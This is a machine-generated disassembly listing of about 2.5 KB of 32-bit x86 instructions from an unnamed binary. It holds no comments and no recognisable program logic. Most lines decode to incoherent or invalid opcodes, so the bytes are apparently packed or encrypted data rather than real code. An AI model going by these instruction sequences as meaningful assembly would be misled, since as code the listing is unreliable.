  42ee02:	sub    BYTE PTR [ebp+0x59],ah
  42ee05:	pop    esp
  42ee06:	or     ecx,DWORD PTR [eax-0x101c8a2a]
  42ee0c:	xor    eax,0xcde56743
  42ee11:	xchg   esp,eax
  42ee12:	dec    esp
  42ee13:	add    BYTE PTR [esi],ah
  42ee15:	sbb    dl,BYTE PTR [ebp+0x22]
  42ee18:	aam    0xde
  42ee1a:	add    eax,0x997384b8
  42ee1f:	outs   dx,DWORD PTR ds:[esi]
  42ee20:	mov    ah,0xbc
  42ee22:	scas   eax,DWORD PTR es:[edi]
  42ee23:	add    esp,esp
  42ee25:	jno    0x42edb5
  42ee27:	inc    edi
  42ee28:	jb     0x42edc9
  42ee2a:	sbb    eax,0xcd366db8
  42ee2f:	xor    DWORD PTR [edx+0x441eb9d0],eax
  42ee35:	cmp    DWORD PTR [ebx-0x75],ebx
  42ee38:	das    
  42ee39:	mov    ds:0xe99293df,al
  42ee3e:	mov    bl,0x95
  42ee40:	sub    ch,BYTE PTR [ecx+0x1]
  42ee43:	sbb    al,0x50
  42ee45:	aam    0x2d
  42ee47:	sub    eax,0xc161b753
  42ee4c:	xchg   DWORD PTR [ecx-0x22],esp
  42ee4f:	adc    bh,dh
  42ee51:	push   edi
  42ee53:	mov    ebx,0x4014b3d0
  42ee58:	aam    0x6f
  42ee5a:	rcl    BYTE PTR [eax-0x68],1
  42ee5d:	adc    eax,0xf232d462
  42ee62:	iret   
  42ee63:	ficomp WORD PTR [ebx]
  42ee65:	jbe    0x42eecc
  42ee67:	fild   DWORD PTR [eax-0x37]
  42ee6a:	and    BYTE PTR [esi+ebx*4],cl
  42ee6d:	mov    al,0xb0
  42ee6f:	out    dx,eax
  42ee70:	in     al,dx
  42ee71:	dec    ecx
  42ee72:	or     dl,BYTE PTR [edx-0x9]
  42ee75:	mov    ecx,ss
  42ee77:	push   esp
  42ee78:	into   
  42ee79:	pop    eax
  42ee7a:	(bad)  
  42ee7c:	sahf   
  42ee7d:	mov    WORD PTR [ebp+0x6f],es
  42ee80:	mov    WORD PTR [ebx+0x3ca37f07],?
  42ee86:	outs   dx,BYTE PTR ds:[esi]
  42ee87:	lods   eax,DWORD PTR ds:[esi]
  42ee88:	dec    esp
  42ee89:	and    al,0x9b
  42ee8b:	dec    ebx
  42ee8c:	sbb    al,0x2f
  42ee8e:	or     esi,DWORD PTR [edx+0x0]
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef01:	adc    edi,DWORD PTR [esi]
  42ef03:	rcr    DWORD PTR [esi+esi*8+0x1],cl
  42ef07:	add    BYTE PTR [ecx+eax*1],al
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	jge    0x42ef8d
  42ef0e:	data16 (bad) 
  42ef10:	mov    ebx,0x553a645f
  42ef15:	addr16 fs cwde 
  42ef18:	retf   
  42ef19:	out    0x36,eax
  42ef1b:	pop    esp
  42ef1c:	mov    dl,0xb3
  42ef1e:	xor    esi,edi
  42ef20:	popf   
  42ef21:	pop    ebp
  42ef22:	out    0x67,al
  42ef24:	scas   al,BYTE PTR es:[edi]
  42ef25:	repz and eax,0xffbb073d
  42ef2b:	mov    ah,0xe4
  42ef2d:	fs dec edi
  42ef2f:	mov    eax,ds:0x2e02aeac
  42ef34:	mov    bl,0x92
  42ef36:	or     ebp,eax
  42ef38:	adc    eax,0xf04b0723
  42ef3d:	int    0x36
  42ef3f:	shl    DWORD PTR [ebx],1
  42ef41:	push   es
  42ef42:	lock pushf 
  42ef44:	stc    
  42ef45:	push   ebx
  42ef46:	sub    DWORD PTR [eax-0x75],esi
  42ef49:	ins    BYTE PTR es:[edi],dx
  42ef4a:	or     bh,BYTE PTR [edx]
  42ef4c:	and    DWORD PTR [edx],eax
  42ef4e:	ror    ch,0xb1
  42ef51:	outs   dx,BYTE PTR ds:[esi]
  42ef52:	sub    DWORD PTR [ecx-0x4a],eax
  42ef55:	(bad)  
  42ef56:	sub    eax,0x101ad3f9
  42ef5b:	icebp  
  42ef5c:	push   esp
  42ef5d:	ins    BYTE PTR es:[edi],dx
  42ef5e:	imul   edx,DWORD PTR [ecx-0x691e3e0],0x3e
  42ef65:	dec    esp
  42ef66:	cli    
  42ef67:	jmp    FWORD PTR [esi-0x7d]
  42ef6a:	add    DWORD PTR [edx+0xcd6066f],ebx
  42ef70:	inc    eax
  42ef71:	xlat   BYTE PTR ds:[ebx]
  42ef72:	push   ecx
  42ef73:	pop    ss
  42ef74:	xchg   ecx,eax
  42ef75:	sbb    BYTE PTR [eax-0x7e10a833],cl
  42ef7b:	out    dx,al
  42ef7c:	xchg   ecx,eax
  42ef7d:	and    ecx,DWORD PTR [ebp+0x60]
  42ef80:	jo     0x42ef8f
  42ef82:	push   cs
  42ef83:	xor    esi,DWORD PTR [ebx+0x780fd8f7]
  42ef89:	fbstp  TBYTE PTR [eax]
  42ef8b:	jmp    0x3ff00bab
  42ef90:	mov    bl,0xc1
  42ef92:	sbb    DWORD PTR [ecx+0x3e2f37c8],esi
  42ef98:	repnz (bad) 
  42ef9a:	into   
  42ef9b:	sbb    eax,0xd2fe95dc
  42efa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efa1:	sahf   
  42efa2:	xchg   esi,eax
  42efa3:	dec    ecx
  42efa4:	xor    ah,cl
  42efa6:	fcomp  QWORD PTR [edi]
  42efa8:	jmp    0x1ed:0xe704141d
  42efaf:	addr16 std 
  42efb1:	aam    0x38
  42efb3:	push   ds
  42efb4:	daa    
  42efb5:	jg     0x42efa6
  42efb7:	cmc    
  42efb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efb9:	jmp    0x7502d2eb
  42efbe:	dec    esp
  42efbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efc0:	mov    edi,0x29dd8e86
  42efc5:	stc    
  42efc6:	fstp   st(7)
  42efc8:	fs inc esp
  42efca:	adc    BYTE PTR [ecx-0x5e],ah
  42efcd:	int    0x5
  42efcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efd0:	repz ret 0x2573
  42efd4:	push   cs
  42efd5:	rcr    DWORD PTR [esi-0x4d],0x75
  42efd9:	xor    edx,DWORD PTR [esi]
  42efdb:	outs   dx,DWORD PTR ds:[esi]
  42efdc:	xchg   edx,eax
  42efdd:	push   ss
  42efde:	fabs   
  42efe0:	fs das 
  42efe2:	xchg   DWORD PTR [eax+0x9a86311],edi
  42efe8:	mov    WORD PTR [eax-0x66638646],cs
  42efee:	sbb    dh,cl
  42eff0:	mov    ch,0xe6
  42eff2:	cmp    edi,0xd7a16d15
  42eff8:	xor    al,0x39
  42effa:	call   0x5bd1f1fb
  42efff:	sub    BYTE PTR [edi+0x42d5f003],dh
  42f005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f006:	jecxz  0x42efa3
  42f008:	ja     0x42f062
  42f00a:	cld    
  42f00b:	and    esp,eax
  42f00d:	sbb    BYTE PTR ds:0x45,0x0
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	inc    ebx
  42f081:	arpl   WORD PTR [edx+0x1f76077],ax
  42f087:	add    BYTE PTR [ecx+eax*1],al
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	imul   esi,DWORD PTR [ebx+0xa],0xffffffa2
  42f090:	push   edi
  42f091:	inc    ebp
  42f092:	ret    0x13c6
  42f095:	push   ebx
  42f096:	mov    al,ds:0x6329745
  42f09b:	pop    esp
  42f09c:	in     al,0xe7
  42f09e:	fdiv   DWORD PTR [esi+0x4]
  42f0a1:	xlat   BYTE PTR ds:[ebx]
  42f0a2:	pop    ss
  42f0a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0a4:	imul   ebp,DWORD PTR [eax],0x7b
  42f0a7:	sbb    eax,0xa528df16
  42f0ac:	adc    bh,BYTE PTR [edx]
  42f0ae:	push   0x32
  42f0b0:	(bad)  
  42f0b1:	jl     0x42f054
  42f0b3:	mov    ds:0xfab1264c,eax
  42f0b8:	in     al,0xc3
  42f0ba:	sub    DWORD PTR [ecx+eax*4],ebp
  42f0bd:	clc    
  42f0be:	mov    esp,0x6b52d585
  42f0c3:	xor    al,0x42
  42f0c5:	out    0x52,eax
  42f0c7:	sub    al,0x5b
  42f0c9:	mov    edx,0xc8fc1efe
  42f0ce:	repnz push edx
  42f0d0:	ins    DWORD PTR es:[edi],dx
  42f0d1:	fidivr DWORD PTR [edi+0x4b]
  42f0d4:	(bad)  
  42f0d5:	and    al,0x7f
  42f0d7:	cmp    DWORD PTR [edi+0x4c7d4858],esp
  42f0dd:	jge    0x42f134
  42f0df:	or     esp,DWORD PTR [esi+edx*4]
  42f0e2:	cli    
  42f0e3:	sbb    eax,0x91f0afbc
  42f0e8:	xchg   DWORD PTR ds:0xea859bbd,ebx
  42f0ee:	jge    0x42f0ff
  42f0f0:	inc    edx
  42f0f1:	test   eax,0xf56e541a
  42f0f6:	(bad)  
  42f0f7:	fsubr  st(2),st
  42f0f9:	cli    
  42f0fa:	jb     0x42f0ab
  42f0fc:	xor    ecx,DWORD PTR [ebp+0x6]
  42f0ff:	das    
  42f100:	push   cs
  42f101:	or     edi,DWORD PTR [esp+edx*8+0x15]
  42f105:	test   BYTE PTR [edi-0x74c7f06e],ch
  42f10b:	xor    esp,ebx
  42f10d:	(bad)  
  42f10e:	leave  
  42f10f:	mov    ecx,DWORD PTR fs:[ebx]
  42f112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f113:	sub    edi,esp
  42f115:	adc    ah,BYTE PTR [edx]
  42f117:	faddp  st(4),st
  42f119:	rcl    BYTE PTR [ecx],0xdc
  42f11c:	aam    0x72
  42f11e:	xor    eax,0xa0cdc6a5
  42f123:	int    0x51
  42f125:	or     eax,0x579cb6d6
  42f12a:	mov    ecx,es
  42f12c:	loope  0x42f0eb
  42f12e:	mov    al,ds:0x2ce6b232
  42f133:	mov    edx,0x45c48e94
  42f138:	loopne 0x42f197
  42f13a:	adc    eax,0x14dd14e6
  42f13f:	xchg   esp,eax
  42f140:	call   0xdfe1:0x6c641cf7
  42f147:	in     eax,dx
  42f148:	sbb    BYTE PTR [eax-0x77],dl
  42f14b:	clc    
  42f14c:	ror    DWORD PTR [ebp-0x6d],cl
  42f14f:	shl    DWORD PTR [edx],cl
  42f151:	mov    ds:0xadb9bfdd,eax
  42f156:	add    cl,BYTE PTR [esi+0x47]
  42f159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f15a:	dec    edi
  42f15b:	cmp    eax,0x6ac60977
  42f160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f161:	test   ax,si
  42f164:	and    BYTE PTR [ebx+0x442f6c22],cl
  42f16a:	add    esp,DWORD PTR [eax-0x29c610d4]
  42f170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f171:	jmp    0xfa8a:0xab209281
  42f178:	fwait
  42f179:	gs dec eax
  42f17b:	imul   ebp,DWORD PTR [ecx+0xaadc4eb],0xffffffe9
  42f182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f183:	mov    edx,DWORD PTR [ebp+0x21]
  42f186:	std    
  42f187:	sbb    DWORD PTR [ebp+0x12],esp
  42f18a:	(bad)  
  42f18b:	mov    ebx,0x28c3dd42
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	pusha  
  42f201:	iret   
  42f202:	mov    DWORD PTR [esp+eiz*2-0x8],0x1040001
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	divps  xmm2,XMMWORD PTR [ecx]
  42f20f:	mov    bh,0xb6
  42f211:	dec    ebp
  42f212:	add    bl,BYTE PTR [edx]
  42f214:	xchg   edi,eax
  42f215:	adc    eax,0x5b91ecc8
  42f21a:	call   0x1244d3cb
  42f21f:	mov    edx,0xaecadfd3
  42f224:	mov    esi,DWORD PTR [edi-0x5a0b41e1]
  42f22a:	mov    bl,0xac
  42f22c:	adc    DWORD PTR [ecx+edi*1+0x4f582bb9],esi
  42f233:	mov    BYTE PTR [edi+0x57],al
  42f236:	lds    esp,FWORD PTR [ebx-0x5b]
  42f239:	cmp    ebp,esp
  42f23b:	push   esp
  42f23c:	dec    edi
  42f23d:	xchg   edx,eax
  42f23e:	pop    ebx
  42f23f:	and    DWORD PTR [edi+esi*1],ebx
  42f242:	out    dx,al
  42f243:	bound  esi,QWORD PTR [edi]
  42f245:	mov    ds:0x116b4d4b,al
  42f24a:	push   cs
  42f24b:	ds sahf 
  42f24d:	xor    DWORD PTR [eax+0xd261a32],0xc538c3a2
  42f257:	jge    0x42f26c
  42f259:	clc    
  42f25a:	mov    ds:0xb9995b,al
  42f25f:	in     al,dx
  42f260:	mov    ds:0xdf7ac581,al
  42f265:	jo     0x42f275
  42f267:	or     BYTE PTR [ebp-0x1],ah
  42f26a:	sub    al,0xcc
  42f26d:	lds    ebx,FWORD PTR [esp+esi*4-0xc22d9d5]
  42f274:	dec    esp
  42f275:	lods   eax,DWORD PTR ds:[esi]
  42f276:	add    al,0xae
  42f278:	mov    esp,0x7c531d98
  42f27d:	jmp    0x98547c8f
  42f282:	xchg   esi,eax
  42f283:	lods   al,BYTE PTR ds:[esi]
  42f284:	mov    ds:0x594ca1ec,al
  42f289:	dec    ecx
  42f28a:	outs   dx,BYTE PTR ds:[esi]
  42f28b:	or     BYTE PTR [ecx],0x6f
  42f28e:	int    0x9a
  42f290:	cmp    eax,0x811f5c7c
  42f295:	addr16 inc ecx
  42f297:	sub    eax,0xefcba3bb
  42f29c:	sbb    DWORD PTR [esi+eax*8-0x635393a2],esp
  42f2a3:	mov    ebp,0xbe4c415a
  42f2a8:	enter  0x3bf,0x98
  42f2ac:	arpl   WORD PTR [edi-0x53],di
  42f2af:	push   ebp
  42f2b0:	add    DWORD PTR [edi+0x41],edx
  42f2b3:	pop    ds
  42f2b4:	loop   0x42f2c9
  42f2b6:	jmp    FWORD PTR [edi-0x7c]
  42f2b9:	mov    ebp,0xa7677f6f
  42f2be:	add    BYTE PTR [edi],0x8e
  42f2c1:	cdq    
  42f2c2:	mov    esi,0xcb8d8d6e
  42f2c7:	scas   eax,DWORD PTR es:[edi]
  42f2c8:	mov    ebp,0x443e9b7d
  42f2cd:	cmp    eax,0xd9b378a2
  42f2d2:	cmp    BYTE PTR [eax],bl
  42f2d4:	xchg   edx,eax
  42f2d5:	lahf   
  42f2d6:	fidivr DWORD PTR [ecx-0x4c]
  42f2d9:	outs   dx,DWORD PTR ds:[esi]
  42f2da:	mov    ds:0x1e5fe500,eax
  42f2df:	and    ecx,edi
  42f2e1:	popf   
  42f2e2:	pop    ss
  42f2e3:	cmp    eax,0x7f41ed2f
  42f2e8:	push   es
  42f2e9:	mov    eax,ds:0x864a25d1
  42f2ee:	mov    ds:0xc7466b58,al
  42f2f3:	inc    eax
  42f2f4:	pop    esi
  42f2f5:	pusha  
  42f2f6:	or     al,BYTE PTR [edx-0x636bc601]
  42f2fc:	inc    edi
  42f2fd:	js     0x42f342
  42f2ff:	and    dl,BYTE PTR [eax]
  42f301:	cmp    BYTE PTR [ecx],dh
  42f303:	push   ebp
  42f304:	rol    DWORD PTR [ebx+0x19],1
  42f307:	daa    
  42f308:	and    BYTE PTR [ebx-0x65],dl
  42f30b:	enter  0x496f,0x95
  42f30f:	xor    eax,DWORD PTR [eax]
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	in     al,dx
  42f381:	rol    BYTE PTR [esi+0x1f968d6],0x0
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	xchg   DWORD PTR [esi+0x29],edi
  42f38f:	jno    0x42f331
  42f391:	pop    es
  42f392:	xor    al,0x65
  42f394:	xlat   BYTE PTR ds:[ebx]
  42f395:	mov    BYTE PTR [ebx],bh
  42f397:	dec    esp
  42f398:	sbb    dh,bl
  42f39a:	pop    edi
  42f39b:	mov    eax,ds:0x7971e16c
  42f3a0:	xchg   esi,eax
  42f3a1:	jae    0x42f343
  42f3a3:	mov    ah,0x2b
  42f3a5:	daa    
  42f3a6:	aad    0x2
  42f3a8:	xor    BYTE PTR [ebx+edx*1+0x16],cl
  42f3ac:	mov    bl,0x2f
  42f3ae:	hlt    
  42f3af:	mov    ebp,0x2b5f3951
  42f3b4:	stc    
  42f3b5:	inc    esi
  42f3b6:	inc    esp
  42f3b7:	iret   
  42f3b8:	int3   
  42f3b9:	cmp    edi,ebx
  42f3bb:	sub    BYTE PTR [edi+0x39484e68],bl
  42f3c1:	jmp    0xca1f:0x177cd7db
  42f3c8:	ins    DWORD PTR es:[edi],dx
  42f3c9:	jbe    0x42f413
  42f3cb:	cmp    al,0x72
  42f3cd:	cmp    ecx,DWORD PTR [edx+0x1]
  42f3d0:	popf   
  42f3d1:	(bad)  
  42f3d3:	leave  
  42f3d4:	in     al,dx
  42f3d5:	cmp    al,0xe5
  42f3d7:	dec    ecx
  42f3d8:	(bad)  
  42f3d9:	pop    ds
  42f3da:	and    DWORD PTR [ecx+0x12bdcaf],edx
  42f3e0:	adc    dh,dl
  42f3e2:	daa    
  42f3e3:	call   0x80bea9d7
  42f3e8:	imul   edi,DWORD PTR [edx-0x38ee7574],0xfffffff9
  42f3ef:	out    0xaf,eax
  42f3f1:	or     BYTE PTR [edi],ch
  42f3f3:	out    0xc0,eax
  42f3f5:	gs out 0x3,eax
  42f3f8:	inc    ebp
  42f3f9:	and    BYTE PTR [edi+eax*2-0x3e931102],ah
  42f400:	add    eax,0x7ce0b48a
  42f405:	stos   BYTE PTR es:[edi],al
  42f406:	int3   
  42f407:	adc    ch,BYTE PTR [esp+edx*8-0x6f]
  42f40b:	add    al,0x98
  42f40d:	clc    
  42f40e:	xchg   ebx,eax
  42f40f:	jmp    DWORD PTR [esi+0x79]
  42f412:	xchg   DWORD PTR [esi-0xbfe3626],esp
  42f418:	add    esi,DWORD PTR [edi+0x1c2fb544]
  42f41e:	mov    esp,0x46c00174
  42f423:	pusha  
  42f424:	stos   BYTE PTR es:[edi],al
  42f425:	mov    ds:0x41cc71ec,al
  42f42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f42b:	xor    DWORD PTR [edx+ecx*1+0x4f],ebx
  42f42f:	mov    esi,0xeabc8c32
  42f434:	test   DWORD PTR ds:0xc114371d,esi
  42f43a:	xchg   ebx,eax
  42f43b:	(bad)  
  42f43c:	xchg   ebp,eax
  42f43d:	pop    edx
  42f43e:	ins    BYTE PTR es:[edi],dx
  42f43f:	mov    edi,DWORD PTR [ebx-0x7941f8b6]
  42f445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f446:	ins    DWORD PTR es:[edi],dx
  42f447:	jne    0x42f455
  42f449:	fsubr  QWORD PTR [edx]
  42f44b:	inc    esi
  42f44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f44d:	arpl   WORD PTR [edi-0x2c],di
  42f450:	and    al,0x35
  42f452:	jne    0x42f4ad
  42f454:	mov    cl,0x92
  42f456:	mov    eax,DWORD PTR [eax]
  42f458:	in     al,0x9b
  42f45a:	iret   
  42f45b:	pushf  
  42f45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f45d:	xor    ebp,0xd
  42f460:	scas   eax,DWORD PTR es:[edi]
  42f461:	adc    DWORD PTR [edi+ebp*1+0x5a],ebx
  42f465:	(bad)  [edi]
  42f467:	sub    ebx,DWORD PTR [edi-0x520da364]
  42f46d:	add    al,0x12
  42f46f:	xchg   DWORD PTR ds:0xbaee5c9f,esi
  42f475:	jp     0x42f4eb
  42f477:	inc    esp
  42f478:	xchg   esi,eax
  42f479:	repnz sub eax,DWORD PTR [esi+0x44161c58]
  42f480:	repz pop edi
  42f482:	(bad)  
  42f483:	push   ds
  42f484:	shr    DWORD PTR [edi],1
  42f486:	sbb    edx,0xffffffff
  42f489:	sbb    DWORD PTR [ebp-0x1d],edi
  42f48c:	xor    eax,0x83ba0d
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	xchg   edx,eax
  42f501:	xchg   edx,eax
  42f502:	lahf   
  42f503:	outs   dx,DWORD PTR ds:[esi]
  42f504:	ins    BYTE PTR es:[edi],dx
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	adc    al,0xd3
  42f50e:	pushf  
  42f50f:	jmp    0x42f55a
  42f511:	add    eax,0xe18be978
  42f516:	retf   
  42f517:	jge    0x42f4d4
  42f519:	mov    ah,BYTE PTR [ebx]
  42f51b:	cwde   
  42f51c:	mov    WORD PTR fs:[edi-0x4bf3433a],ds
  42f523:	fisub  DWORD PTR [edx]
  42f525:	push   cs
  42f526:	data16 add al,0x44
  42f529:	sub    BYTE PTR [ecx+0x38],0xf6
  42f52d:	push   ebx
  42f52e:	add    al,0xa1
  42f530:	fcomi  st,st(1)
  42f532:	js     0x42f4b5
  42f534:	arpl   WORD PTR [ebx+edi*2-0x3c],cx
  42f538:	sbb    al,0xb5
  42f53a:	iret   
  42f53b:	imul   edx,DWORD PTR fs:[ebx+edi*4+0x4e461417],0xffffffae
  42f544:	push   esi
  42f545:	ja     0x42f590
  42f547:	push   ecx
  42f548:	mov    ds:0xe3047846,al
  42f54d:	frstor [ebx]
  42f54f:	aaa    
  42f550:	add    ah,BYTE PTR [ebp-0x4ae38b24]
  42f556:	stos   BYTE PTR es:[edi],al
  42f557:	mov    bh,BYTE PTR [ecx-0x64]
  42f55a:	push   cs
  42f55b:	fcomp  QWORD PTR [ebx+0x25]
  42f55e:	stc    
  42f55f:	sbb    ecx,DWORD PTR [ebx]
  42f561:	leave  
  42f562:	lods   eax,DWORD PTR ds:[esi]
  42f563:	in     al,0x5b
  42f565:	imul   ecx,DWORD PTR [edi+0xccca68],0x696a9c40
  42f56f:	popf   
  42f570:	mov    dh,0x51
  42f572:	les    ebx,FWORD PTR [ebx]
  42f574:	pop    esp
  42f575:	inc    esi
  42f576:	adc    al,0x61
  42f578:	neg    DWORD PTR [esi-0x444bbce2]
  42f57e:	loopne 0x42f568
  42f580:	jmp    0x64564c6f
  42f585:	sbb    al,0x78
  42f587:	cmp    esi,edi
  42f589:	and    al,0xa8
  42f58b:	xchg   ecx,eax
  42f58c:	xor    eax,0x980d23e9
  42f591:	adc    bh,dl
  42f593:	xor    esi,eax
  42f595:	nop
  42f596:	jl     0x42f5a2
  42f598:	push   eax
  42f599:	cli    
  42f59a:	(bad)  
  42f59c:	gs pop ds
  42f59e:	adc    BYTE PTR [edx],al
  42f5a0:	pop    ebx
  42f5a1:	mov    ds:0xc7568c5,al
  42f5a6:	dec    edi
  42f5a7:	jl     0x42f5ad
  42f5a9:	pop    ebp
  42f5aa:	fcmovnb st,st(3)
  42f5ac:	test   al,0xcb
  42f5ae:	ret    
  42f5af:	test   BYTE PTR [edx],bh
  42f5b1:	push   es
  42f5b2:	(bad)
  42f5b5:	and    al,0x44
  42f5b7:	jp     0x42f56c
  42f5b9:	out    dx,eax
  42f5ba:	add    edx,DWORD PTR ds:0x79b8512f
  42f5c0:	mov    eax,ds:0xe3aa2ecf
  42f5c5:	mov    ch,0x6
  42f5c7:	sbb    al,BYTE PTR [ebx-0x3a5134f5]
  42f5cd:	into   
  42f5ce:	push   esp
  42f5cf:	xlat   BYTE PTR ds:[ebx]
  42f5d0:	xor    edi,DWORD PTR [eax+0x21859a60]
  42f5d6:	push   edi
  42f5d7:	adc    bl,BYTE PTR [ebp+0x2b]
  42f5da:	xchg   ecx,eax
  42f5db:	cmp    DWORD PTR [eax],0xfffffff2
  42f5de:	ret    
  42f5df:	push   ds
  42f5e0:	jo     0x42f5b5
  42f5e2:	rcr    DWORD PTR [ecx],0xb6
  42f5e5:	fdiv   DWORD PTR [edx+edi*4-0x7201b5e]
  42f5ec:	jle    0x42f62a
  42f5ee:	cmp    eax,0xb42adc36
  42f5f3:	mov    ds:0xc3d89dfa,eax
  42f5f8:	jmp    DWORD PTR [eax-0x1ab9a72a]
  42f5fe:	adc    ecx,DWORD PTR [edx+0x33]
  42f601:	cwde   
  42f602:	xlat   BYTE PTR ds:[ebx]
  42f603:	fist   WORD PTR [ebp+0x1ce4a802]
  42f609:	cwde   
  42f60a:	adc    cl,bh
  42f60c:	mov    ebp,0x2c37b3
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	gs mov eax,0xfb7004e9
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	pop    edx
  42f68d:	xchg   ebp,eax
  42f68e:	add    al,0x5
  42f690:	pop    ebp
  42f691:	ds int3 
  42f693:	push   ss
  42f694:	push   edi
  42f695:	jbe    0x42f6c5
  42f697:	sbb    ah,BYTE PTR [ebx]
  42f699:	mov    dl,0xbb
  42f69b:	sbb    esp,ebx
  42f69d:	cld    
  42f69e:	daa    
  42f69f:	fld    DWORD PTR [esi]
  42f6a1:	pop    ds
  42f6a2:	stc    
  42f6a3:	int    0x5d
  42f6a5:	pop    ecx
  42f6a6:	xchg   esi,eax
  42f6a7:	push   0xffffffac
  42f6a9:	scas   eax,DWORD PTR es:[edi]
  42f6aa:	push   eax
  42f6ab:	lds    edi,FWORD PTR [ebx+edx*4]
  42f6ae:	jae    0x42f645
  42f6b0:	pop    ds
  42f6b1:	and    eax,0x386edfe
  42f6b6:	dec    edx
  42f6b7:	in     al,dx
  42f6b8:	jmp    0xeb7e:0x914c1284
  42f6bf:	or     al,0xa
  42f6c1:	les    edi,FWORD PTR [ebx-0x79d7a62c]
  42f6c7:	(bad)  
  42f6c8:	aad    0xa7
  42f6ca:	add    edi,DWORD PTR [esi*1+0x778c5ace]
  42f6d1:	mov    DWORD PTR [ebp-0x35],eax
  42f6d4:	iret   
  42f6d5:	dec    edi
  42f6d6:	fld    DWORD PTR [ecx+eax*4-0x47758c02]
  42f6dd:	and    al,0xdb
  42f6df:	(bad)  
  42f6e0:	daa    
  42f6e1:	cmp    DWORD PTR [ecx-0x277d6eb0],ebx
  42f6e7:	xchg   edi,eax
  42f6e8:	int    0x80
  42f6ea:	imul   ebp,ecx,0xed7b276b
  42f6f0:	mov    esi,0x840a4935
  42f6f5:	sti    
  42f6f6:	repnz sbb DWORD PTR [ebx-0x6b],0xfb0bec43
  42f6fe:	mov    eax,0xc15e87d2
  42f703:	mov    ch,0x5c
  42f705:	cdq    
  42f706:	jg     0x42f6ee
  42f708:	push   eax
  42f709:	fild   DWORD PTR [ebx+0x11f63df9]
  42f70f:	adc    eax,0x1fdcf43c
  42f714:	mov    ?,edx
  42f716:	imul   ecx,ebx,0xffffff85
  42f719:	mov    DWORD PTR [ebx],edi
  42f71b:	call   0x9b5a1f3f
  42f720:	popa   
  42f721:	call   0x8b14af5e
  42f726:	xor    ch,BYTE PTR [eax+0x40d8443c]
  42f72c:	shl    BYTE PTR [esi+0x12b52903],1
  42f732:	dec    ebp
  42f733:	shl    DWORD PTR [edx-0x4e],1
  42f736:	mov    DWORD PTR [esi+eiz*4-0x39],esp
  42f73a:	mov    dl,0xba
  42f73c:	hlt    
  42f73d:	test   al,0x2a
  42f73f:	push   0x1816d78d
  42f744:	fild   DWORD PTR [edi-0x1c962bd0]
  42f74a:	adc    al,0x5a
  42f74c:	sub    al,bl
  42f74e:	popf   
  42f74f:	xchg   edi,eax
  42f750:	jns    0x42f6de
  42f752:	push   esi
  42f753:	mov    edx,0x96fcb224
  42f758:	pop    ebp
  42f759:	in     al,dx
  42f75a:	outs   dx,BYTE PTR ds:[esi]
  42f75b:	lds    ebp,FWORD PTR [di-0xf32]
  42f760:	in     al,0x3f
  42f762:	rcl    DWORD PTR [esi],cl
  42f764:	shl    DWORD PTR [ebp-0xe],0xf1
  42f768:	aam    0x71
  42f76a:	sbb    cl,BYTE PTR [edx+0x6f]
  42f76d:	cmp    ch,BYTE PTR [esi-0x77]
  42f770:	push   esp
  42f771:	adc    DWORD PTR [ebx],0x6b
  42f774:	inc    ebp
  42f775:	shl    DWORD PTR ds:0xda15bfea,cl
  42f77b:	jge    0x42f707
  42f77d:	sbb    eax,0xce0160ea
  42f782:	jg     0x42f70c
  42f784:	mov    ds:0x7501d07c,al
  42f789:	pop    es
  42f78a:	sub    BYTE PTR [edi],bh
  42f78c:	xchg   BYTE PTR [ebp+0xe5a7],bh
	...
  42f7f2:	add    BYTE PTR [eax],al
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
